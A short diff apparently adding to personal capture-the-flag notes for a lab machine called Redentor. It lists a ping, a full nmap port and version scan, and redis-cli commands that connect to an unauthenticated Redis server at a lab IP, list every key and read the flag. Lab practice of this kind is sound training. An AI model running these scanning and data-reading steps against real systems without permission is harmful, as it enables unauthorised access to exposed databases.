@@ -35,3 +35,8 @@ cat flag.txt
 Redentor
 ping 10.129.47.43
 nmap -p- -sV 10.129.47.43
+redis-cli -h 10.129.47.43
+info
+select 0
+keys *
+get flag
